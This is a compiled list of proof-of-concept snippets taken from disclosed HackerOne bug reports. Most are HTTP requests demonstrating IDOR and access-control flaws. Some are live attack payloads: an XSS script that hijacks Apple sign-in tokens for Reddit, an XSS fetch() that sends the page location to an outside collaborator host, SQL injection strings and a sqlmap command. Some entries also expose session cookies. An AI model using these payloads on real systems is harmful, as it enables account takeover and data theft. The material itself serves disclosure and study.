vend_register%5Bid%5D=&vend_register%5Boutlet_id%5D=<outled id from A>&vend_register%5B_csrf_token%5D=<csrf token>&vend_register%5Bname%5D=6&vend_register%5Bcash_managed_payment_id%5D=<cash managed payment id>&vend_register%5Breceipt_template_id%5D=<receipt template id>&vend_register%5Binvoice_sequence%5D=1&vend_register%5Binvoice_prefix%5D=&vend_register%5Binvoice_suffix%5D=&vend_register%5Bask_for_user_on_sale%5D=0&vend_register%5Bemail_receipt%5D=1&vend_register%5Bprint_receipt%5D=1&vend_register%5Bask_for_note_on_save%5D=1&vend_register%5Bprint_note_on_receipt%5D=1&vend_register%5Bshow_discounts%5D=1&return=
```

## 95. [#1567186](https://hackerone.com/reports/1567186)  -  One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com
*critical*

```html
<script>var b, x;
var state = parent.location.href.substr(location.href.indexOf('state='));
var d = document.createElement('div');
if (!window.inited) {
  window.inited = true;
d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
parent.document.children[parent.document.children.length - 1].appendChild(d);
if(top!==parent.window) top.postMessage('stopinject', '*');
parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
x = setInterval(function() {
if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
  clearInterval(x);
};

}, 500);
}
</script>
```

## 96. [#2442008](https://hackerone.com/reports/2442008)  -  Attachment disclosure via summary report
*critical*

```http
PUT /reports/████/summaries/███████ HTTP/2
Host: hackerone.com
Content-Length: 908
Origin: https://hackerone.com

{"id":████████,"category":"researcher","content":"TESTEDIT\n\n{F3155244} ","updated_at":"2024-03-30T17:16:29.625Z","user":{"id":█████,"username":"█████","name":"██████████████","bio":"please see pdfx","cleared":false,"verified":false,"website":null,"location":"","created_at":"2024-03-29T11:27:50.077Z","url":"https://hackerone.com/██████████","hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-█████.png","medium":"/assets/avatars/default-███████.png","xtralarge":"/assets/avatars/default-███████.png"}},"can_view?":true,"can_create?":true,"attachments":[],"action_type":"publish","attachment_ids":[
3155239]}
```

## 97. [#1175980](https://hackerone.com/reports/1175980)  -  [Transportation Management Services Solution 2.0] Improper authorization at  tmss.gsa.gov leads to data exposure of all registered users
*critical*

```http
GET /tmssserver/api/public/customerregistration/4500/userId/ HTTP/1.1
Host: tmss.gsa.gov
Referer: https://tmss.preprod-acqit.helix.gsa.gov/tmss/customerregistration
```

## 98. [#895798](https://hackerone.com/reports/895798)  -  [H1-2006 2020] Bounty Pay CTF challenge
*critical*

```sh
$ for subodomain in $(cat subdomains.txt); do ffuf -u "https://${subodomain}/FUZZ" -w common.txt -mc 200,301; done
```

## 99. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```

## 100. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=Hello+{{name}}{{template:38dhs_admins_only_header.html}}+....&preview_data={"name":"Alice","email":"alice@test.com"}
```

## 101. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=Hello+{{name}}+....&preview_data={"name":"Alice{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```

## 102. [#1489077](https://hackerone.com/reports/1489077)  -  Bypass of fix #1370749
*low, $900*

```http
POST /admin/online-store/themes?hmac=████&host=c2hha3RpLWphbjIwMjIubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-IN&session=███&shop=shakti-jan2022.myshopify.com&timestamp=1645562098&_signed_params=host%2Clocale%2Csession%2Cshop%2Ctimestamp HTTP/1.1
Host: shakti-jan2022.myshopify.com
Content-Length: 581
Origin: null
Content-Type: application/x-www-form-urlencoded
```

## 103. [#510759](https://hackerone.com/reports/510759)  -  IDOR in Report CSV export discloses the IDs of Custom Field Attributes of Programs
*low*

```http
POST /reports/export HTTP/1.1
Host: localhost:8080

----------868143055
Content-Disposition: form-data; name="report_ids[]"

17
----------868143055
Content-Disposition: form-data; name="report_ids[]"

118
...
```

## 104. [#3325582](https://hackerone.com/reports/3325582)  -  User Can Delete Other Users' Personal Access Tokens at /delete-token/{token_id}/ on Mozilla Pontoon
*low*

```http
POST /generate-token/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: {your cookies here}
Referer: https://mozilla-pontoon-staging.herokuapp.com/settings/
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: https://mozilla-pontoon-staging.herokuapp.com
```

## 105. [#3325582](https://hackerone.com/reports/3325582)  -  User Can Delete Other Users' Personal Access Tokens at /delete-token/{token_id}/ on Mozilla Pontoon
*low*

```http
POST /delete-token/{Victim Token Id Here}/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: {Attacker Cookies Here}
Referer: https://mozilla-pontoon-staging.herokuapp.com/settings/
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: https://mozilla-pontoon-staging.herokuapp.com
```

## 106. [#1555502](https://hackerone.com/reports/1555502)  -  Collaborators and Staff members without all necessary permissions are able to create, edit and install custom apps
*medium, $1,900*

```http
POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2
Host: <YOUR_STORE>
Cookie: <STAFF_MEMBER_COOKIE>
Content-Length: 428
X-Csrf-Token: <CSRF_TOKEN>
Content-Type: application/json
Origin: https://19kun-19.myshopify.com

{
   "operationName":"CreateAppMutation",
   "variables":{
      "input":{
         "title":"Broken Access PoC",
         "maintainerUserId":"gid://shopify/StaffMember/<STAFF_MEMBER_ID>"
      }
   },
   "query":"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\n  shopOwnedAppCreate(input: $input) {\n    app {\n      id\n      title\n      __typename\n    }\n    userErrors {\n      field\n      message\n      code\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```

## 107. [#3081691](https://hackerone.com/reports/3081691)  -  1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com
*high*

```
https://auth.hostinger.com/login/?redirectUrl=https%3A%2F%2Fmarketing.hostinger.com%2Fen-us%2Fmarketplace_wix%2Fsite_not_published%3Fredirect_url%3Dx%22%3E%3C%2Fa%3E%3Cscript%3Efetch%28%27https%3A%2F%2Fwqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2Cbody%3A%20window.location%7D%29%3C%2Fscript%3E

## Decoded URL:

https://auth.hostinger.com/login/?redirectUrl=https://marketing.hostinger.com/en-us/marketplace_wix/site_not_published?redirect_url=x"></a><script>fetch('wqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com',%20{method:%20'POST',body:%20window.location});</script>
```

## 108. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```http
GET https://api.bykea.net/api/v1/bookings/███?_id={{user_id2}}&token_id={{access_token2}}

Headers:
    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169
    X-App-Version: 1.0.169
```

## 109. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```http
GET https://api.bykea.net/api/v2/bids/████████?_id={{user_id2}}&token_id={{access_token2}}

Headers:
    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169
    X-App-Version: 1.0.169
```

## 110. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```http
GET https://boleelagao.bykea.net/v1/config?lat=29.5500097&lng=67.88333979999993&service_code=23&trip_id=██████

Headers:
    X-Lb-User-Id: {{user_id2}}
    X-Lb-User-Token: {{access_token2}}
```

## 111. [#1486310](https://hackerone.com/reports/1486310)  -  admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..
*high*

```http
GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
Host: admin.8x8.vc
Referer: https://admin.8x8.vc/
Content-Type: application/json
Authorization: <Member user's JWT>
```

## 112. [#1486310](https://hackerone.com/reports/1486310)  -  admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..
*high*

```http
GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
Host: admin.8x8.vc
Referer: https://admin.8x8.vc/
Content-Type: application/json
```

## 113. [#1848176](https://hackerone.com/reports/1848176)  -  IDOR in TalentMAP API can be abused to enumerate personal information of all the users
*high*

```http
GET /api/v1/permission/user/{USER_ID}/ HTTP/1.1

Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8000/
JWT: {token}
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

## 114. [#1692788](https://hackerone.com/reports/1692788)  -  Attacker is able to query Github repositories of arbitrary Shopify Hydrogen Users
*low, $900*

```http
POST /admin/internal/web/graphql/core?operation=GitHubRepositoriesQuery&type=query HTTP/2
Host: <ATTACKER_SHOPIFY_DOMAIN>
Cookie: <COOKIES_ATTACKER>
Content-Length: 778
X-Csrf-Token: <CSRF_TOKEN_ATTACKER>
Content-Type: application/json

{
   "operationName":"GitHubRepositoriesQuery",
   "variables":{
      "ownerName":"<OWNER_NAME>",
      "ownerId":<OWNER_ID>,
      "searchQuery":"",
      "pageSize":15
   },
   "query":"query GitHubRepositoriesQuery($ownerName: String!, $ownerId: Int, $searchQuery: String, $pageSize: Int, $cursor: String) {\n  onlineStore {\n    versionControlGithub {\n      repositories(\n        ownerName: $ownerName\n        ownerId: $ownerId\n        first: $pageSize\n        searchQuery: $searchQuery\n        after: $cursor\n      ) {\n        totalCount\n        endCursor\n        hasNextPage\n        nodes {\n          id\n          name\n          description\n          writeAccess\n          defaultBranchName\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```

## 115. [#1546726](https://hackerone.com/reports/1546726)  -  Anonymous access control - Payments Status
*medium, $100*

```http
GET /payments/paym_test_5rjz482tky43reoil9f/status HTTP/2
Host: api.omise.co
Referer: https://api.omise.co/

2. Response:
```

## 116. [#447488](https://hackerone.com/reports/447488)  -  Corrupted Authorization header can cause logs not to be ingested properly in ████████
*medium*

```http
POST /graphql?secret=1 HTTP/2
Host: hackerone.com
Authorization: Basic LSBBOkI=
```

## 117. [#313050](https://hackerone.com/reports/313050)  -  IDOR in treat subscriptions
*medium*

```http
POST /php/filter_user_tab_content.php HTTP/1.1
```

## 118. [#369581](https://hackerone.com/reports/369581)  -  HTTP PUT method enabled
*critical*

```http
PUT /emitrani.txt HTTP/1.1
Host: ratelimited.me
Content-Length: 10

emitrani POC
```

## 119. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /admin/report?url=L2FkbWluL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJhLmFsbGlzb24= HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbF…
```

## 120. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /?template[]=ticket&ticket_id=3582&template[]=login&username=sandra.allison HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOV…
```

## 121. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ= HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOV…
```

## 122. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ= HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOV…
```

## 123. [#1661113](https://hackerone.com/reports/1661113)  -  IDOR allows an attacker to modify the links of any user
*high*

```http
POST / HTTP/2
Host: gql.reddit.com
Content-Length: 62
Authorization: Bearer * * * * * * *  * * * * * * * * * * * * * * * * * * * * * * * * *  * * * * *  *
Content-Type: application/json
```

## 124. [#2516250](https://hackerone.com/reports/2516250)  -  Access Control Vulnerability Enabling Unauthorized Access to Limited Disclosure Reports
*high*

```http
POST /reports/bulk HTTP/2
Host: hackerone.com
Cookie: <USER B Cookies>
Referer: https://hackerone.com/reports/2424755
X-Csrf-Token: <USER B CSRF TOKEN>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
```

## 125. [#751299](https://hackerone.com/reports/751299)  -  Improper Authorization
*high*

```http
PUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1
Host: my.stripo.email
Authorization: Bearer null
Content-Type: application/json;charset=UTF-8
Content-Length: 231
Origin: https://my.stripo.email
```

## 126. [#2207248](https://hackerone.com/reports/2207248)  -  IDOR on GraphQL queries BillingDocumentDownload and BillDetails
*medium, $5,000*

```http
POST /api/shopify/███?operation=BillDetails&type=query HTTP/2
Host: admin.shopify.com
Cookie: ██████████
Content-Type: application/json
X-Csrf-Token: ████████
Content-Length: 6674
Origin: https://admin.shopify.com
```

## 127. [#2207248](https://hackerone.com/reports/2207248)  -  IDOR on GraphQL queries BillingDocumentDownload and BillDetails
*medium, $5,000*

```http
POST /api/shopify/██████?operation=BillingDocumentDownload&type=mutation HTTP/2
Host: admin.shopify.com
Cookie: ██████
Content-Type: application/json
X-Csrf-Token: ████
Content-Length: 433
Origin: https://admin.shopify.com
```

## 128. [#981472](https://hackerone.com/reports/981472)  -  Undocumented `fileCopy` GraphQL API
*medium, $2,000*

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
X-CSRF-Token: [REDACTED]
Content-Type: application/json
Host: storeA.myshopify.com
Content-Length: 485

{"query":"\r\nmutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {\r\nfile{\r\n    \r\n    path\r\n}\r\n userErrors {\r\n    field\r\n    message\r\n}\r\n    }\r\n}","variables":{
                        "absoluteKey": "s/files/1/d/0864/0471/6006/6199/files/1.jpg",
                        "key": "files/1.jpg",
                        "path": "https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"
}
}
```

## 129. [#1555502](https://hackerone.com/reports/1555502)  -  Collaborators and Staff members without all necessary permissions are able to create, edit and install custom apps
*medium, $1,900*

```http
POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2
Host: <YOUR_STORE>
Cookie: <STAFF_MEMBER_COOKIE>
Content-Length: 428
X-Csrf-Token: <CSRF_TOKEN>
Content-Type: application/json
Origin: https://19kun-19.myshopify.com
```

## 130. [#1010835](https://hackerone.com/reports/1010835)  -  Low Privileged Staff Member Can Export Billing Charges
*medium, $1,900*

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
X-CSRF-Token: [REDACTED]
Content-Type: application/json
Host: [YOUR-SHOP].myshopify.com
Content-Length: 303

{"query":"\r\n        \r\nmutation BillingChargesExport($id:ID!,$exportFormat:ExportFormat){billingChargesExport(id:$id,exportFormat:$exportFormat){message userErrors{field message __typename}__typename}}\r\n","variables":{
"id": "gid://shopify/BillingInvoice/58138130",
"exportFormat":"EXCEL_CSV"
}}
```

## 131. [#1010835](https://hackerone.com/reports/1010835)  -  Low Privileged Staff Member Can Export Billing Charges
*medium, $1,900*

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
X-CSRF-Token: [REDACTED]
Content-Type: application/json
Host: [YOUR-SHOP].myshopify.com
Content-Length: 303

{"query":"\r\n        \r\nmutation BillingChargesExport($id:ID!,$exportFormat:ExportFormat){billingChargesExport(id:$id,exportFormat:$exportFormat){message userErrors{field message __typename}__typename}}\r\n","variables":{
```

## 132. [#980511](https://hackerone.com/reports/980511)  -  A staff member with no permissions can edit Store Customer Email
*medium, $1,500*

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Cookie: [REDACTED]
X-CSRF-Token: [REDACTED]
Content-Type: application/json
Host: [YOUR-DOMAIN].myshopify.com
Content-Length: 346

{"query":"\r\nmutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!){  emailSenderConfigurationUpdate(input:$input) {\r\n    emailSenderConfiguration{\r\n        id\r\n    }\r\n\r\nuserErrors {\r\n    field\r\n    message\r\n}\r\n}\r\n}","variables":{
  "input":{
      "senderEmail":"███"
  }
}}
```

## 133. [#2528293](https://hackerone.com/reports/2528293)  -  IDOR Exposes All Machine Learning Models
*medium, $1,160*

```http
POST /api/graphql HTTP/2
Host: gitlab.com
Content-Type: application/json
Content-Length: 1620
Origin: https://gitlab.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModel","variables":{"id":"gid://gitlab/Ml::Model/1000401"},"query":"query getModel($id: MlModelID!) {\n  mlModel(id: $id) {\n    id\n    description\n    name\n    versionCount\n    candidateCount\n    latestVersion {\n      id\n      version\n      packageId\n      description\n      candidate {\n        id\n        name\n        iid\n        eid\n        status\n        params {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metadata {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metrics {\n          nodes {\n            id\n            name\n            value\n            step\n            __typename\n          }\n          __typename\n        }\n        ciJob {\n          id\n          webPath\n          name\n          pipeline {\n            id\n            mergeRequest {\n              id\n              iid\n              title\n              webUrl\n              __typename\n            }\n            user {\n              id\n              avatarUrl\n              webUrl\n              username\n              name\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        _links {\n          showPath\n          artifactPath\n          __typename\n        }\n        __typename\n      }\n      _links {\n        showPath\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
# … truncated …
```

## 134. [#2528293](https://hackerone.com/reports/2528293)  -  IDOR Exposes All Machine Learning Models
*medium, $1,160*

```http
POST /api/graphql HTTP/2
Host: gitlab.com
Content-Type: application/json
Content-Length: 1714
Origin: https://gitlab.com
Cookie: <replace-here>
X-Csrf-Token: <replace-here>

{"operationName":"getModelVersion","variables":{"modelId":"gid://gitlab/Ml::Model/1000401","modelVersionId":"gid://gitlab/Ml::ModelVersion/1000535"},"query":"query getModelVersion($modelId: MlModelID!, $modelVersionId: MlModelVersionID!) {\n  mlModel(id: $modelId) {\n    id\n    name\n    version(modelVersionId: $modelVersionId) {\n      id\n      version\n      packageId\n      description\n      candidate {\n        id\n        name\n        iid\n        eid\n        status\n        params {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metadata {\n          nodes {\n            id\n            name\n            value\n            __typename\n          }\n          __typename\n        }\n        metrics {\n          nodes {\n            id\n            name\n            value\n            step\n            __typename\n          }\n          __typename\n        }\n        ciJob {\n          id\n          webPath\n          name\n          pipeline {\n            id\n            mergeRequest {\n              id\n              iid\n              title\n              webUrl\n              __typename\n            }\n            user {\n              id\n              avatarUrl\n              webUrl\n              username\n              name\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        _links {\n          showPath\n          artifactPath\n          __typename\n        }\n        __typename\n      }\n      _links {\n        showPath\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
# … truncated …
```

## 135. [#2541962](https://hackerone.com/reports/2541962)  -  Disclose Hidden Comments on Media Section of hub.vroid.com
*medium, $500*

```http
POST /api/statuses/PASTE_ID_HERE/hearts HTTP/2
Host: hub.vroid.com
Cookie: ATTACKER_COOKIES
Content-Type: application/json
Content-Length: 2

{}
```

## 136. [#304240](https://hackerone.com/reports/304240)  -  Unrestricted access to Eureka server on ██████
*medium, $500*

```http
PUT ████████HTTP/1.1
Host: ██████myteksi.net
```

## 137. [#909863](https://hackerone.com/reports/909863)  -  Low privileged user can create high privileged user's KITCRM authorization token and can read and write message to KIT
*medium*

```http
POST /api/v2/messages HTTP/1.1
Host: www.kitcrm.com
Authorization: Bearer 1fbb7a0ebb0dd18c2f3697f51fde49a541a30608255d9a1a258XXXXXXXX
Content-Type: application/json
Content-Length: 40

{
  "incoming_message" : "testtesthai"
}
```

## 138. [#909863](https://hackerone.com/reports/909863)  -  Low privileged user can create high privileged user's KITCRM authorization token and can read and write message to KIT
*medium*

```http
POST /api/v2/messages HTTP/1.1
Host: www.kitcrm.com
Authorization: Bearer 1fbb7a0ebb0dd18c2f3697f51fde49a541a30608255d9a1a258XXXXXXXX
Content-Type: application/json
Content-Length: 40

{
```

## 139. [#547663](https://hackerone.com/reports/547663)  -  IDOR in changing shared file name
*medium*

```http
POST / HTTP/1.1
Host: graphql2.trint.com
Referer: https://app.trint.com/trints
content-type: application/json
Authorization: Bearer token..
Origin: https://app.trint.com
Content-Length: 536

{"operationName":"updateTranscriptMeta","variables":{"userId":"5cc05c8f03c35799283fe3b7","transcriptId":"dM3YxaINQGyWceq5rUzVog","transcriptName":"W00"},"query":"mutation updateTranscriptMeta($userId: String!, $transcriptName: String!, $transcriptId: String!) {\n  updateTranscriptMeta(userId: $userId, transcriptMeta: {trintTitle: $transcriptName}, transcriptId: $transcriptId) {\n    ...RenameTrintFragment\n    __typename\n  }\n}\n\nfragment RenameTrintFragment on TrintMetadata {\n  _id\n  trintTitle\n  updated\n  __typename\n}\n"}
```

## 140. [#547663](https://hackerone.com/reports/547663)  -  IDOR in changing shared file name
*medium*

```http
POST / HTTP/1.1
Host: graphql2.trint.com
Referer: https://app.trint.com/trints
content-type: application/json
Authorization: Bearer token..
Origin: https://app.trint.com
Content-Length: 536
```

## 141. [#1167753](https://hackerone.com/reports/1167753)  -  Add new managed stores without permission
*medium*

```http
POST /100808/stores/create_managed_store HTTP/1.1
Host: partners.shopify.com
Referer: https://partners.shopify.com/100808/stores/new?store_type=managed_store
Content-Type: application/json
X-Requested-With: XMLHttpRequest
X-CSRF-Token: ...

{"message":"","permissions":["applications","customers","dashboard","domains","draft_orders","edit_orders","gift_cards","links","locations","marketing","marketing_section","orders","overviews","pages","products","reports","themes","preferences","view_shopify_payments_payouts","view_billing_details","view_private_apps","edit_private_apps"],"store_domain":"myStore1","collaborator_access_code":""}
```

## 142. [#2112973](https://hackerone.com/reports/2112973)  -  Enabling Birthday Contact to any user
*medium*

```http
POST /remote.php/dav/calendars/{userId}

<x3:enable-birthday-calendar xmlns:x3="http://nextcloud.com/ns"/>
```

## 143. [#318751](https://hackerone.com/reports/318751)  -  Access to Private Photos of Apps in App section(IDOR)
*medium*

```http
GET /listings/hackeronevg1110/shop_screenshots/85952 HTTP/1.1
Host: exchange.shopify.com
Cookie: [Cookies]
```

## 144. [#1118638](https://hackerone.com/reports/1118638)  -  IDOR at training.smartpay.gsa.gov/reports/quizzes-taken-by-user
*medium*

```http
GET /reports/quizzes-taken-by-user.csv/1226357?page&_format=csv HTTP/1.1
Host: training.smartpay.gsa.gov
Referer: https://training.smartpay.gsa.gov/reports/quizzes-taken-by-user
Cookie: SSESS28e7f609ef3740479765aac8be8703ba=xzcTawn0KZkMPGcsSl2KlRBSwOH8PJDmJ5BpAKI5yNA
```

## 145. [#1118638](https://hackerone.com/reports/1118638)  -  IDOR at training.smartpay.gsa.gov/reports/quizzes-taken-by-user
*medium*

```http
GET /reports/quizzes-taken-by-user.csv/1226356?page&_format=csv HTTP/1.1
Host: training.smartpay.gsa.gov
Referer: https://training.smartpay.gsa.gov/reports/quizzes-taken-by-user
Cookie: SSESS28e7f609ef3740479765aac8be8703ba=xzcTawn0KZkMPGcsSl2KlRBSwOH8PJDmJ5BpAKI5yNA
```

## 146. [#1450117](https://hackerone.com/reports/1450117)  -  Nextcloud Deck : Possibility for anyone to add a stack with existing tasks on anyone's board
*medium*

```http
PUT /apps/deck/stacks/31 HTTP/1.1
Host: nextcloud.yourserver.com
Content-Type: application/json;charset=utf-8
Content-Length: 136
Origin: https://nextcloud.yourserver.com
Cookie: <your_session_cookies>

{"title":"IDOR","boardId":14,"deletedAt":0,"lastModified":1642201857,"order":0,"id":31,"ETag":"a5f7e3ab477ee2a2259f0889a63130a8"}
```

## 147. [#3081691](https://hackerone.com/reports/3081691)  -  1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com
*high*

```html
<script>fetch('wqqf8xerhgrhdk251cesqastbkhb54xsm.oastify.com',%20{method:%20'POST',body:%20window.location});</script>
```

## 148. [#2374730](https://hackerone.com/reports/2374730)  -  Broken Access Control (IDOR) in Booking Detail and Bids Could Leads to Sensitive Information Disclosure
*high*

```http
POST https://api.bykea.net/api/v1/trips/create

Headers:
    User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169
    X-App-Version: 1.0.169

    Body:
    {
        "advertisement_id": "REDACTED",
        "token_id": "{{access_token}}",
        "pickup_info": {
            "lng": 67.883339799999931,
            "lat": 29.5500097,
            "address": "Ø³Ø¨Û, ØªØØµÛÙ Ø³Ø¨Û, Ø¶ÙØ¹ Ø³Ø¨Û, Ø³Ø¨Û ÚÙÛÚÙ, Ø¨ÙÙÚØ³ØªØ§Ù, 82000, Ù¾Ø§Ú©Ø³ØªØ§Ù"
        },
        "trip": {
            "creator": "iOS",
            "service_code": 23,
            "lng": 67.883339799999931,
            "lat": 29.5500097,
            "customer_bid": 75
        },
        "dropoff_info": {
            "address": "Kurak, ØªØØµÛÙ Ø³Ø¨Û, Ø¶ÙØ¹ Ø³Ø¨Û, Ø³Ø¨Û ÚÙÛÚÙ, Ø¨ÙÙÚØ³ØªØ§Ù, Ù¾Ø§Ú©Ø³ØªØ§Ù",
            "lat": 29.573396420702664,
            "lng": 67.898040153086185
        },
        "_id": "{{user_id}}"
    }
```

## 149. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```js
$(".upgradeToAdmin").click(function() {
		let t = $('input[name="username"]').val();
		$.get("/admin/upgrade?username=" + t, function() {
			alert("User Upgraded to Admin")
		})
	}), $(".tab").click(function() {
		return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
	}), $(".sendReport").click(function() {
		$.get("/admin/report?url=" + url, function() {
			alert("Report sent to admin team")
		}), $("#myModal").modal("hide")
	}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

## 150. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```
123' UNION SELECT "' UNION SELECT 1,2,'../api/x'-- ","456","789"--
```

## 151. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
+ and then redirected to /evil-quiz/score which was loaded after 5 seconds, that means it was vulnerable to sql injection. This sql injection was of second order because of name was injected on one post request address and output was reflecting on different address `/evil-quiz/score.`

+ In order to exploit even better, I've used tool as sqlmap.

Command - `python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score"`

where exploit.txt was defined as
```

